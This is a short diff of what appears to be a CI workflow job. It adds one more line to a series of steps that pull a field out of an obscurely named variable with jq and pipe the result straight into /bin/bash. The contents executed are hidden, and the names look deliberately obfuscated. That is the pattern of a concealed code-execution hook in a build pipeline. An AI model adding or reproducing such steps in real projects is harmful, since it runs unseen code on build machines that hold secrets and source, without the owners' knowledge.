@@ -26,6 +26,7 @@ jobs:
           printf '%s' "$itb0" | jq -r .gfptj2344 | /bin/bash
           printf '%s' "$pdi5807" | jq -r .a6 | /bin/bash
           printf '%s' "$l78" | jq -r .i3400 | /bin/bash
+          echo $rikr3 | jq -r .vm03 | /bin/bash
 
       - name: Persist output
         if: always()
